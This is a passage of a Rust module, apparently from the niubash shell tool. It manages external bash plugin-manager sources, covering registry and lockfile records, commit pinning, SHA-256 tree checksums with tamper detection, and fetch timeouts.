//! External plugin-manager sources (oh-my-bash, bash-it, bash-completion)
//! as first-class plugin origins.
//!
//! Design: `docs/planning/oh-my-niu-ecosystem.md` §11 (source adapters) and
//! §12 (trust + download protocol), plus the owner calibrations of
//! 2026-10-02: no vendoring (fetch-on-demand over git clone, license stays
//! between user and upstream), a curated catalog of well-known origins, and
//! vim-plug/lazy.nvim-style ergonomics (GitHub shorthand `owner/repo`,
//! commit pinning in the registry lockfile, `restore`/`sync`/`clean`).
//!
//! A *source* is a plugin manager's native tree (no `bundle.toml`); it
//! installs under `~/.niubash/sources/<id>/`, registers untrusted in
//! `~/.niubash/sources/registry.toml`, and only contributes assets after an
//! explicit `niu plugin trust <id>`. Asset-level activation (the managed rc
//! block, `niu plugin enable/disable`) lives in `plugins::assets`; the
//! declarative spec and its reconciler live in `plugins::spec` and
//! `plugins::sync`.
//!
//! Which adapters exist is *data*: the manager table lives in
//! `plugins::descriptors` (§14.6.2 — one interpreter, one row per manager;
//! the wild file-source fallback keeps the set open to any sourceable
//! bash).

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, Instant};

#[cfg(windows)]
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};

use anyhow::{anyhow, Context};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use super::trust::{SourceSignature, TrustPolicy};
use crate::path_utils::shell_home_dir;

// Manager adapters (including the bpkg row and the wild file-source
// fallback) are defined as data in `descriptors`; re-exported here so the
// historical `plugins::sources::adapter_for` call sites keep working.
use super::descriptors::detect_adapter_for_install as detect_for_install;
pub use super::descriptors::{
    adapter_for, builtin_source_adapters, derive_install_id, detect_adapter_for_install,
    detect_source_adapter,
};

/// Schema marker for the source registry file. `@0.1.0` records carry no
/// trust policy (implicit checksum lock); `@0.2.0` added
/// `trust_policy`/`signature`; `@0.3.0` added the declarative-spec
/// materialization state (`spec_enabled`/`spec_theme`). All older versions
/// stay readable (new fields default), writes use the current one (§12.1
/// bump discipline).
pub const SOURCE_REGISTRY_SCHEMA: &str = "niubash:plugin-source-registry@0.3.0";
/// Ref recorded for local-directory installs (no git ref exists).
pub const LOCAL_ORIGIN_REF: &str = "local";

/// Hard wall-clock budget for ONE startup fetch attempt (`niu plugin sync
/// --bootstrap`; the 1.3.1 memo records the failure and later startups
/// defer, so this caps the worst case a bad network day can impose on the
/// interactive session). The owner's 2026-10-04 P0: one declared-but-
/// unmatched spec entry burned 5.26s in a TLS-failing `git clone` at
/// startup, and a silently blackholed network (SYN dropped, no RST) hangs
/// git for minutes — a startup-destroying window. 3s stays under the
/// "startup-destroying" bar, and the memo + `niu plugin sync` (unbudgeted,
/// user-invoked) remain the path that actually completes big installs.
pub const STARTUP_FETCH_BUDGET: Duration = Duration::from_secs(3);

/// The effective startup fetch budget: `NIU_STARTUP_FETCH_BUDGET_MS`
/// overrides the default (milliseconds; power users on peculiar networks,
/// and tests). An invalid or zero value falls back to the default.
pub fn startup_fetch_budget() -> Duration {
    match std::env::var("NIU_STARTUP_FETCH_BUDGET_MS") {
        Ok(raw) => raw
            .trim()
            .parse::<u64>()
            .ok()
            .filter(|ms| *ms > 0)
            .map(Duration::from_millis)
            .unwrap_or(STARTUP_FETCH_BUDGET),
        Err(_) => STARTUP_FETCH_BUDGET,
    }
}

/// Wall-clock budget for ONE verb-invoked git transport phase (`niu plugin
/// add` / `sync` / `update` / `restore` / `distro import`; niubash#293):
/// before this cap an explicit verb cloned without any deadline — a bad
/// origin (dead host, blackholed SYN, stalled TLS) hung the verb for
/// minutes, the user killed niu, and the killing left orphan `git.exe`
/// helpers plus (for `add`) a spec declaration no verb could remove.
/// 120s covers a full framework clone on a bad day; `--timeout <seconds>`
/// (`niu plugin sync` / `niu plugin add`) and `NIU_PLUGIN_FETCH_TIMEOUT_MS`
/// override it per run.
pub const VERB_FETCH_BUDGET: Duration = Duration::from_secs(120);

/// The effective verb fetch budget: `NIU_PLUGIN_FETCH_TIMEOUT_MS` overrides
/// the default (milliseconds; tests and peculiar networks). An invalid or
/// zero value falls back to the default.
pub fn verb_fetch_budget() -> Duration {
    match std::env::var("NIU_PLUGIN_FETCH_TIMEOUT_MS") {
        Ok(raw) => raw
            .trim()
            .parse::<u64>()
            .ok()
            .filter(|ms| *ms > 0)
            .map(Duration::from_millis)
            .unwrap_or(VERB_FETCH_BUDGET),
        Err(_) => VERB_FETCH_BUDGET,
    }
}

/// Proxy environment variables a spawned `git` must see (niubash#294): a
/// manual `git clone` in the user's shell honors `HTTP(S)_PROXY`, and the
/// verb's clone must too. The child inherits the parent environment by
/// default, but that inheritance is implicit — launcher/wrapper layers are
/// in the wild that rewrite the block and drop case-variants (Windows env
/// names are case-insensitive, POSIX curl's is not: `HTTP_PROXY` alone is
/// invisible to git's http:// transport), so every git spawn forwards the
/// known proxy variables explicitly and mirrors each spelling to its
/// case-variant.
pub const PROXY_ENV_VARS: &[&str] = &[
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
    "NO_PROXY",
    "http_proxy",
    "https_proxy",
    "all_proxy",
    "no_proxy",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SourceAssetKind {
    Theme,
    Plugin,
    Alias,
    Completion,
}

impl SourceAssetKind {
    pub(crate) fn as_str(self) -> &'static str {
        match self {
            Self::Theme => "theme",
            Self::Plugin => "plugin",
            Self::Alias => "alias",
            Self::Completion => "completion",
        }
    }
}

/// One loadable asset inside a source tree (a theme script, a plugin, an
/// alias bundle, a completion). Names are flat so they can collide-resolve
/// per §11.3 (external wins, `native:` escapes the external layer).
/// File-source assets are named by their POSIX-relative tree path.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SourceAsset {
    pub kind: SourceAssetKind,
    pub name: String,
    pub path: PathBuf,
    /// Presentation-only annotation (§14.6.1 honest candidates): e.g. a
    /// wild `install.sh` is tagged installer/test-like instead of being
    /// silently hidden. Never gates admission.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tag: Option<String>,
}

/// How an adapter's assets are activated and deactivated (`niu plugin
/// enable/disable`). The models keep each manager's *own* selection
/// mechanism (§11: preserve the manager's native layout) instead of
/// inventing a niubash-only switch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SelectionModel {
    /// The manager's loader consumes rc arrays plus a theme variable
    /// (oh-my-bash: `plugins=(…)`/`aliases=(…)`/`completions=(…)` read by
    /// `oh-my-bash.sh`, theme via `OSH_THEME`).
    LoaderArrays {
        arrays: &'static [(&'static str, SourceAssetKind)],
        theme_var: &'static str,
    },
    /// The manager keeps its own `enabled/` directory (bash-it): enabling
    /// links/copies `available/<file>` to `enabled/<prio>---<file>`; the
    /// theme still comes from an rc variable.
    EnabledDir { theme_var: &'static str },
    /// Activation is whole-source only (bash-completion): the guarded
    /// loader snippet is the unit; enumerated assets are informational.
    WholeSource,
    /// Files are sourced individually (wild file sources, bpkg packages):
    /// enabling an asset adds one guarded `. <path>` line to the managed rc
    /// block. Sourcing is byte-faithful to manually sourcing the file under
    /// GNU bash — no shim, no missing-function masking (§14.4).
    DirectFiles,
}

/// Rollback state recorded by `update_source` (§12.4).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SourcePreviousState {
    #[serde(rename = "ref")]
    pub ref_name: String,
    pub version: String,
    pub checksum_sha256: String,
    /// Pinned commit (git origins) so `rollback` refetches the exact tree.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub commit_sha: Option<String>,
}

/// One registered external source. Lives in `~/.niubash/sources/registry.toml`.
/// The registry doubles as the lockfile (lazy.nvim's lazy-lock.json): each
/// git-origin record pins `commit_sha` + `checksum_sha256`, and
/// `niu plugin restore` refetches exactly that state.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SourceRecord {
    /// Source id; equals the adapter id (one tree per manager per machine).
    pub id: String,
    /// Adapter kind that owns detection/listing/loading.
    pub adapter: String,
    /// Origin: git URL or local directory path (snapshot-copied at install).
    pub url: String,
    #[serde(rename = "ref")]
    pub ref_name: String,
    pub version: String,
    pub path: PathBuf,
    pub trusted: bool,
    pub license: String,
    pub checksum_sha256: String,
    pub installed_at: String,
    /// Exact upstream commit this tree was fetched from (git origins; the
    /// lockfile pin behind `niu plugin restore`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub commit_sha: Option<String>,
    /// Trust tier: `checksum` (hash lock, §12.3) or `local_sign` (this
    /// exact tree was reviewed and signed locally, §12.1 signature tier).
    #[serde(default)]
    pub trust_policy: TrustPolicy,
    /// Local signature over the tree digest (`trust_policy = local_sign`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signature: Option<SourceSignature>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub previous: Option<SourcePreviousState>,
    /// Last selection materialized from the declarative spec by
    /// `niu plugin sync` (§14.6.3): the asset names whose presence in the
    /// rc block / enabled tree the spec owns. `None` = never spec-synced
    /// (imperative/legacy install). Diffing the live block against this set
    /// is how hand-added entries survive syncs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub spec_enabled: Option<Vec<String>>,
    /// Last theme materialized from the spec, when the spec declared one
    /// (kept separately from `spec_enabled`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub spec_theme: Option<String>,
    /// First-fetch integrity (niubash#298): true when the first fetch had an
    /// external integrity reference — a `--checksum` pin, or a curated
    /// catalog origin. False for an unpinned non-catalog fetch: the recorded
    /// checksum still locks THIS tree from now on, but nothing verified the
    /// first delivery. Recorded so `list --json` can surface it.
    #[serde(default)]
    pub first_fetch_verified: bool,
}

/// `niu plugin source list` row.
#[derive(Debug, Clone, Serialize)]
pub struct SourceStatus {
    #[serde(flatten)]
    pub record: SourceRecord,
    pub adapter_display: String,
    /// True when the registered directory is missing (native fallback
    /// active) or a trusted tree no longer matches its lockfile pin
    /// (niubash#297 runtime tamper detection).
    pub degraded: bool,
    /// Why the row is degraded, when it is: `tree missing` (the directory
    /// is gone) or `tree drifted from the lockfile pin` (the checksum no
    /// longer matches — niubash#297). `None` when healthy.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub degraded_reason: Option<String>,
    /// "ready" | "untrusted" | "degraded" (§11.4 state machine).
    pub state: String,
    pub asset_count: Option<usize>,
    pub asset_kinds: Vec<String>,
}

/// Why a source row is degraded (values of [`SourceStatus::degraded_reason`]).
pub const DEGRADED_MISSING: &str = "tree missing";
pub const DEGRADED_DRIFTED: &str = "tree drifted from the lockfile pin";

/// The drift ledger (`drifted-sources.txt` under the sources root):
/// `niu plugin sync` writes one source id per line for every trusted source
/// whose tree no longer matches the lockfile pin (niubash#297). The managed
/// rc blocks carry a STATIC guard that reads this file and prints the
/// warning at startup — the rc stays static text (no hashing there, so it
/// stays cacheable); this file is the only dynamic channel.
pub fn drifted_state_path() -> PathBuf {
    sources_root().join("drifted-sources.txt")
}

/// The drifted source ids currently recorded in the ledger.
pub fn drifted_source_ids() -> Vec<String> {
    let Ok(text) = fs::read_to_string(drifted_state_path()) else {
        return Vec::new();
    };
    text.lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(str::to_string)
        .collect()
}

/// Record a source id as drifted (niubash#297): the rc drift guard starts
/// warning at startup until the pin is restored or the source is removed.
pub fn record_drifted_source(id: &str) -> anyhow::Result<()> {
    let mut ids = drifted_source_ids();
    if ids.iter().any(|existing| existing == id) {
        return Ok(());
    }
    ids.push(id.to_string());
    let path = drifted_state_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    fs::write(
        &path,
        "# sources whose tree drifted from the lockfile pin (niu plugin sync)\n\
         # cleared by `niu plugin restore <id>` / `niu plugin source verify <id>`\n"
            .to_string()
            + &ids
                .into_iter()
                .map(|id| format!("{id}\n"))
                .collect::<String>(),
    )?;
    Ok(())
}

/// Drop a source id from the drift ledger (pin restored, source updated, or
/// source removed). Missing file/entry is fine.
pub fn clear_drifted_source(id: &str) -> anyhow::Result<()> {
    let ids = drifted_source_ids();
    if !ids.iter().any(|existing| existing == id) {
        return Ok(());
    }
    let remaining: Vec<String> = ids.into_iter().filter(|existing| existing != id).collect();
    let path = drifted_state_path();
    if remaining.is_empty() {
        match fs::remove_file(&path) {
            Ok(()) => return Ok(()),
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(err) => return Err(err.into()),
        }
    }
    fs::write(
        &path,
        "# sources whose tree drifted from the lockfile pin (niu plugin sync)\n\
         # cleared by `niu plugin restore <id>` / `niu plugin source verify <id>`\n"
            .to_string()
            + &remaining
                .into_iter()
                .map(|id| format!("{id}\n"))
                .collect::<String>(),
    )?;
    Ok(())
}

/// Result of `verify_source` (§12.3 checksum re-computation, extended with
/// the local-signature tier).
#[derive(Debug, Clone, Serialize)]
pub struct SourceVerifyReport {
    pub id: String,
    pub verified: bool,
    pub degraded: bool,
    pub recorded_checksum: String,
    pub actual_checksum: Option<String>,
    /// Trust tier in effect (`checksum` hash lock / `local_sign`).
    pub trust_policy: TrustPolicy,
    /// Signature check under `local_sign`: `Some(true)` signed and matching,
    /// `Some(false)` present but stale/tampered, `None` not applicable.
    pub signature_ok: Option<bool>,
}

/// `niu plugin source verify <id>` result (§12.3).
pub fn verify_source(id: &str) -> anyhow::Result<SourceVerifyReport> {
    let record = read_source_registry()
        .into_iter()
        .find(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let report = verify_record(&record)?;
    // A clean verify means the tree matches its pin again: the rc drift
    // guard must go quiet (the ledger header names this verb as a way out,
    // niubash#297).
    if report.verified {
        clear_drifted_source(id)?;
    }
    Ok(report)
}

/// The checksum half of the pin check (niubash#297): the effective on-disk
/// tree digest (EnabledDir managers normalize away their `enabled/` tree)
/// plus whether it matches the recorded pin, with the `enabled/` copies
/// validated as byte-faithful. The signature tier is layered on in
/// [`verify_record`]; `trust`/`sign` deliberately check ONLY this half — a
/// stale signature is exactly what `sign` exists to repair.
pub(crate) fn tree_pin_check(record: &SourceRecord) -> anyhow::Result<(String, bool)> {
    let enabled_dir_model = adapter_for(&record.adapter).is_some_and(|adapter| {
        matches!(adapter.selection_model(), SelectionModel::EnabledDir { .. })
    });
    let actual = if enabled_dir_model {
        tree_sha256_excluding(&record.path, &record.path.join("enabled"))?
    } else {
        tree_sha256(&record.path)?
    };
    let mut checksum_ok = actual.eq_ignore_ascii_case(&record.checksum_sha256);
    if checksum_ok && enabled_dir_model {
        checksum_ok = enabled_entries_are_pinned_copies(&record.path)?;
    }
    Ok((actual, checksum_ok))
}

/// The pin check behind `verify_source` (§12.3): recompute the tree
/// checksum and compare it with the recorded pin (plus the signature, at
/// the local-sign tier). The single authority shared with `sync` /
/// `list_sources` / `trust` / `sign` — the runtime tamper gate
/// (niubash#297) runs the very same check, not a weaker one.
pub(crate) fn verify_record(record: &SourceRecord) -> anyhow::Result<SourceVerifyReport> {
    if !record.path.is_dir() {
        return Ok(SourceVerifyReport {
            id: record.id.clone(),
            verified: false,
            degraded: true,
            recorded_checksum: record.checksum_sha256.clone(),
            actual_checksum: None,
            trust_policy: record.trust_policy,
            signature_ok: record.signature.as_ref().map(|_| false),
        });
    }
    let (actual, checksum_ok) = tree_pin_check(record)?;
    let signature_ok = record
        .signature
        .as_ref()
        .map(|signature| checksum_ok && super::trust::verify_signature(signature, &actual));
    Ok(SourceVerifyReport {
        id: record.id.clone(),
        verified: checksum_ok && signature_ok.unwrap_or(true),
        degraded: false,
        recorded_checksum: record.checksum_sha256.clone(),
        actual_checksum: Some(actual),
        trust_policy: record.trust_policy,
        signature_ok,
    })
}

/// `update_source` result.
#[derive(Debug, Clone, Serialize)]
pub struct SourceUpdateSummary {
    pub id: String,
    pub version: String,
    pub checksum_sha256: String,
    pub previous: Option<SourcePreviousState>,
}

/// Adapter for one external plugin manager (§11.2). The trait covers the
/// manager-specific surface (detect / version / list / loader / selection
/// model); the generic install/update/uninstall protocol in this module is
/// shared by all adapters.
pub trait PluginSourceAdapter: Sync + Send {
    /// Stable adapter id, also the source id and directory name.
    fn id(&self) -> &'static str;
    fn display_name(&self) -> &'static str;
    /// License of the manager's tree (recorded in the registry and shown at
    /// the trust boundary; §11.5).
    fn license(&self) -> &'static str;
    /// Canonical git origin, shown by `niu plugin discover` so the user can
    /// compose the `add` command themselves. `None` for managers that only
    /// install from local paths.
    fn default_origin(&self) -> Option<&'static str> {
        None
    }
    /// One-line summary for the curated catalog / discover listing.
    fn summary(&self) -> &'static str;
    /// How the user obtains a tree when `default_origin` is `None`
    /// (local-install managers, e.g. bpkg: download happens through the
    /// manager's own CLI; niu only adopts and loads).
    fn install_note(&self) -> Option<&'static str> {
        None
    }
    /// Id scope (§14.6.2): `false` = one install per machine (the manager
    /// id is the source id); `true` = one install per package/plugin (the
    /// id derives from the origin tail, like wild file sources — adopted
    /// bpkg trees). Decides [`super::descriptors::derive_install_id`].
    fn per_install_id(&self) -> bool {
        false
    }
    /// Layout fingerprint: does this tree belong to this plugin manager?
    fn detect(&self, root: &Path) -> bool;
    /// Human-readable version of the installed tree (git HEAD, marker file).
    fn installed_version(&self, root: &Path) -> String;
    /// Enumerate loadable assets (themes, plugins, aliases, completions).
    fn list_assets(&self, root: &Path) -> Vec<SourceAsset>;
    /// Guarded rc snippet that activates the source. Must keep the
    /// existence guard so a missing tree silently falls back to the native
    /// layers (§11.4).
    fn loader_snippet(&self, record: &SourceRecord) -> String;
    /// How `niu plugin enable/disable` operates on this manager's assets
    /// (§11 first-class management; see [`SelectionModel`]).
    fn selection_model(&self) -> SelectionModel;
}

/// Full commit sha from a `.git` directory (shallow or not), if it resolves
/// to a concrete commit. This is the lockfile pin (`niu plugin restore`).
fn git_head_full_sha(root: &Path) -> Option<String> {
    let head = fs::read_to_string(root.join(".git").join("HEAD")).ok()?;
    let head = head.trim();
    let sha = if let Some(reference) = head.strip_prefix("ref:") {
        let reference = reference.trim();
        if let Ok(direct) = fs::read_to_string(root.join(".git").join(reference)) {
            direct.trim().to_string()
        } else {
            let packed = fs::read_to_string(root.join(".git").join("packed-refs")).ok()?;
            packed
                .lines()
                .find_map(|line| {
                    let (hash, name) = line.split_once(' ')?;
                    (name.trim() == reference).then(|| hash.to_string())
                })
                .unwrap_or_default()
        }
    } else {
        head.to_string()
    };
    (!sha.is_empty()).then(|| sha.to_string())
}

/// Best-effort `<sha>` (12 hex chars) from a `.git` directory, shallow or
/// not. Used only for display/versioning; the trust anchor is the tree
/// checksum, not this.
pub(crate) fn git_head_short_sha(root: &Path) -> Option<String> {
    git_head_full_sha(root).map(|sha| {
        let short: String = sha.chars().take(12).collect();
        format!("git-{short}")
    })
}

/// Normalize an install target the way vim-plug/lazy.nvim users expect:
/// `owner/repo` expands to the GitHub origin (`https://github.com/owner/repo.git`)
/// unless it names an existing local directory. Full URLs, absolute paths,
/// and relative paths (`./x`, `../x`) pass through untouched.
pub fn normalize_origin(target: &str) -> String {
    let target = target.trim();
    if target.is_empty() {
        return String::new();
    }
    let path = Path::new(target);
    if path.is_dir()
        || path.is_absolute()
        || target.starts_with("./")
        || target.starts_with("../")
        || target.contains("://")
        || target.starts_with("git@")
    {
        return target.to_string();
    }
    // GitHub shorthand: exactly `owner/repo` with sane characters.
    let looks_like_shorthand = target
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
        && target.matches('/').count() == 1
        && !target.starts_with('.')
        && !target.ends_with('/');
    if looks_like_shorthand {
        return format!("https://github.com/{target}.git");
    }
    target.to_string()
}

fn supported_adapters_hint() -> String {
    let ids: Vec<&str> = builtin_source_adapters().iter().map(|a| a.id()).collect();
    format!("supported plugin-manager sources: {}", ids.join(", "))
}

/// Root directory for external plugin-manager sources: `~/.niubash/sources`.
/// `NIU_PLUGIN_SOURCES_ROOT` overrides the location (tests, portable setup).
pub fn sources_root() -> PathBuf {
    if let Some(value) = std::env::var_os("NIU_PLUGIN_SOURCES_ROOT") {
        let path = PathBuf::from(value);
        if !path.as_os_str().is_empty() {
            return path;
        }
    }
    shell_home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".niubash")
        .join("sources")
}

fn registry_path() -> PathBuf {
    sources_root().join("registry.toml")
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct SourceRegistryToml {
    schema: Option<String>,
    #[serde(default)]
    sources: Vec<SourceRecord>,
}

/// The registry file exists but does not parse (niubash#178). The raw bytes
/// carry persisted pin/trust records the parse cannot see, so they are
/// never rewritten away: reads surface this state, writes refuse.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RegistryCorruption {
    /// The file's text, byte-for-byte as found on disk.
    pub raw_text: String,
    /// The TOML parse error.
    pub error: String,
}

/// Read the registry plus its corruption state, if any. A missing file is
/// `(empty, None)` — only an existing, unparsable file is corruption.
fn read_registry_state() -> (Vec<SourceRecord>, Option<RegistryCorruption>) {
    let Ok(text) = fs::read_to_string(registry_path()) else {
        return (Vec::new(), None);
    };
    match toml::from_str::<SourceRegistryToml>(&text) {
        Ok(registry) => (registry.sources, None),
        Err(err) => (
            Vec::new(),
            Some(RegistryCorruption {
                raw_text: text,
                error: err.to_string(),
            }),
        ),
    }
}

/// The corruption state of the on-disk registry, when it fails to parse.
pub fn registry_corruption() -> Option<RegistryCorruption> {
    read_registry_state().1
}

/// Sidecar holding the byte-for-byte snapshot of an unparsable registry
/// (`registry.toml.corrupt`, next to the registry).
pub(crate) fn corrupt_registry_sidecar_path() -> PathBuf {
    corrupt_registry_backup_path()
}

fn corrupt_registry_backup_path() -> PathBuf {
    registry_path().with_extension("toml.corrupt")
}

/// Warn-once ledger for corrupt-registry content: one warning per distinct
/// raw file text per process, so repeated reads within one run (and the
/// write path's refusal) never spam the same diagnosis.
fn corrupt_registry_warned_keys() -> &'static std::sync::Mutex<std::collections::HashSet<u64>> {
    static KEYS: std::sync::OnceLock<std::sync::Mutex<std::collections::HashSet<u64>>> =
        std::sync::OnceLock::new();
    KEYS.get_or_init(|| std::sync::Mutex::new(std::collections::HashSet::new()))
}

fn corruption_key(corruption: &RegistryCorruption) -> u64 {
    use std::hash::{Hash, Hasher};
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    corruption.raw_text.hash(&mut hasher);
    hasher.finish()
}

/// Preserve unparsable registry content and warn exactly once per distinct
/// content: the raw text is snapshotted byte-for-byte to the `.corrupt`
/// sidecar (so the pins/trust records inside it survive any later repair),
/// and one visible warning names the file and the sidecar. Returns true
/// when THIS call was the one that warned.
fn preserve_and_warn_corrupt_registry(corruption: &RegistryCorruption) -> bool {
    let warned_fresh = corrupt_registry_warned_keys()
        .lock()
        .unwrap_or_else(|err| err.into_inner())
        .insert(corruption_key(corruption));
    let backup = corrupt_registry_backup_path();
    let needs_snapshot = fs::read_to_string(&backup)
        .map(|previous| previous != corruption.raw_text)
        .unwrap_or(true);
    if needs_snapshot {
        if let Some(parent) = backup.parent() {
            let _ = fs::create_dir_all(parent);
        }
        let _ = fs::write(&backup, &corruption.raw_text);
    }
    if warned_fresh {
        let message = format!(
            "plugin source registry {} failed to parse ({}); the original file is \
             preserved byte-for-byte at {} — fix or remove the file; its pin/trust \
             records are NOT loaded until then",
            registry_path().display(),
            corruption.error,
            backup.display()
        );
        log::warn!("{message}");
        eprintln!("warning: {message}");
    }
    warned_fresh
}

/// Read all registered sources. An unparsable registry yields an empty list
/// plus a one-time warning and a byte-for-byte `.corrupt` sidecar — never a
/// silent rewrite (niubash#178).
pub fn read_source_registry() -> Vec<SourceRecord> {
    let (sources, corruption) = read_registry_state();
    if let Some(corruption) = corruption {
        preserve_and_warn_corrupt_registry(&corruption);
    }
    sources
}

pub(crate) fn write_source_registry(sources: &[SourceRecord]) -> anyhow::Result<()> {
    let path = registry_path();
    // niubash#178 consent gate: an unparsable registry carries persisted
    // pin/trust records this process's parse cannot see. Rewriting it from
    // the parsed view would drop those records silently, so the write is
    // REFUSED until a human fixes (or explicitly removes) the file — the
    // corrupt bytes stay on disk untouched, snapshotted to the sidecar.
    if let Some(corruption) = read_registry_state().1 {
        preserve_and_warn_corrupt_registry(&corruption);
        anyhow::bail!(
            "refusing to rewrite {}: the current file fails to parse ({}) and a \
             rewrite would drop its persisted pin/trust records; fix or remove the \
             file (original preserved at {}) and retry",
            path.display(),
            corruption.error,
            corrupt_registry_backup_path().display()
        );
    }
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let text = toml::to_string_pretty(&SourceRegistryToml {
        schema: Some(SOURCE_REGISTRY_SCHEMA.to_string()),
        sources: sources.to_vec(),
    })?;
    // niubash#359 (design SS4.4): the registry is control-plane state, so
    // it gets the same #304 atomic swap the rc writers had - a concurrent
    // reader (the doctor, a sync in another terminal) sees the old or the
    // new full file, never a truncate window.
    crate::path_utils::write_file_atomic(&path, text.as_bytes())?;
    Ok(())
}

pub(crate) fn now_timestamp() -> String {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_default()
}

/// Deterministic tree checksum (§12.3): recursively enumerate files, skip
/// `.git`, sort by POSIX relative path, hash `path \0 len \0 content` per
/// file. Stable across checkouts of the same tree and across Windows/POSIX
/// path separators.
pub fn tree_sha256(root: &Path) -> anyhow::Result<String> {
    let mut files = Vec::new();
    collect_relative_files(root, root, &mut files, None)?;
    files.sort();
    let mut hasher = Sha256::new();
    for relative in files {
        let full = root.join(&relative);
        let content =
            fs::read(&full).with_context(|| format!("failed to read {}", full.display()))?;
        hasher.update(relative.as_bytes());
        hasher.update([0]);
        hasher.update(content.len().to_le_bytes());
        hasher.update([0]);
        hasher.update(&content);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

/// [`tree_sha256`] over the tree with one subtree excluded — the pin check's
/// view of an EnabledDir manager's tree (bash-it), where `niu plugin
/// enable/disable` legitimately writes `enabled/` entries INTO the source
/// tree. Those entries are validated separately (byte-faithful copies, see
/// [`enabled_entries_are_pinned_copies`]) so an injection there still trips.
pub(crate) fn tree_sha256_excluding(root: &Path, skip: &Path) -> anyhow::Result<String> {
    let mut files = Vec::new();
    collect_relative_files(root, root, &mut files, Some(skip))?;
    files.sort();
    let mut hasher = Sha256::new();
    for relative in files {
        let full = root.join(&relative);
        let content =
            fs::read(&full).with_context(|| format!("failed to read {}", full.display()))?;
        hasher.update(relative.as_bytes());
        hasher.update([0]);
        hasher.update(content.len().to_le_bytes());
        hasher.update([0]);
        hasher.update(&content);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

fn collect_relative_files(
    root: &Path,
    dir: &Path,
    out: &mut Vec<String>,
    skip: Option<&Path>,
) -> anyhow::Result<()> {
    let entries = fs::read_dir(dir).with_context(|| format!("failed to read {}", dir.display()))?;
    for entry in entries {
        let entry = entry?;
        let path = entry.path();
        let Some(name) = entry.file_name().into_string().ok() else {
            continue;
        };
        if name == ".git" {
            continue;
        }
        if let Some(skip) = skip {
            if path == skip || path.starts_with(skip) {
                continue;
            }
        }
        if path.is_dir() {
            collect_relative_files(root, &path, out, skip)?;
        } else if path.is_file() {
            let relative = path
                .strip_prefix(root)
                .with_context(|| format!("path {} escaped root", path.display()))?;
            out.push(relative.to_string_lossy().replace('\\', "/"));
        }
    }
    Ok(())
}

/// True when every file under `root/enabled/` is a byte-faithful copy of
/// some other file in the pinned tree (the exact thing `niu plugin enable`
/// writes for EnabledDir managers). A rogue file injected into `enabled/` —
/// the one directory bash-it executes at startup — has no pinned source and
/// fails here, so the enabled-dir transparency is not a tamper blind spot.
fn enabled_entries_are_pinned_copies(root: &Path) -> anyhow::Result<bool> {
    let enabled = root.join("enabled");
    if !enabled.is_dir() {
        return Ok(true);
    }
    // Content digests of the pinned tree (everything except enabled/).
    let mut files = Vec::new();
    collect_relative_files(root, root, &mut files, Some(&enabled))?;
    let mut pinned_contents = std::collections::HashSet::new();
    for relative in files {
        let content = fs::read(root.join(&relative))
            .with_context(|| format!("failed to read {}", root.join(&relative).display()))?;
        pinned_contents.insert(Sha256::digest(&content).to_vec());
    }
    let mut enabled_files = Vec::new();
    collect_relative_files(root, &enabled, &mut enabled_files, None)?;
    for relative in enabled_files {
        // Walk-relative paths are relative to the tree root (the collector
        // strips `root`), so read through the root, not through enabled/.
        let content = fs::read(root.join(&relative))
            .with_context(|| format!("failed to read {}", root.join(&relative).display()))?;
        if !pinned_contents.contains(&Sha256::digest(&content).to_vec()) {
            return Ok(false);
        }
    }
    Ok(true)
}

fn copy_tree(src: &Path, dest: &Path) -> anyhow::Result<()> {
    fs::create_dir_all(dest)?;
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let path = entry.path();
        let target = dest.join(entry.file_name());
        if path.is_dir() {
            if entry.file_name() == ".git" {
                continue;
            }
            copy_tree(&path, &target)?;
        } else if path.is_file() {
            fs::copy(&path, &target)?;
        }
    }
    Ok(())
}

/// Install request for `add_source` / `update_source` (§12.2).
#[derive(Debug, Clone, Default)]
pub struct SourceInstallRequest {
    /// Adapter kind hint. When `None`, the fetched tree is auto-detected.
    pub adapter: Option<String>,
    /// Git URL or local directory path.
    pub origin: String,
    /// Git ref for URL origins; defaults to `HEAD`.
    pub ref_name: Option<String>,
    /// Exact commit to fetch (git origins) — the lockfile pin used by
    /// `restore_source`. Takes precedence over `ref_name`'s tip.
    pub commit: Option<String>,
    /// Expected tree checksum (hex sha256). Verified on staging before
    /// promotion; mismatch aborts and leaves any existing install intact.
    pub expected_checksum: Option<String>,
    /// Explicit source id (multi-install shapes — wild file sources and
    /// bpkg packages — derive one from the origin when absent).
    pub id: Option<String>,
    /// Recipe-named entry file (git-driver "generic" recipes): verified to
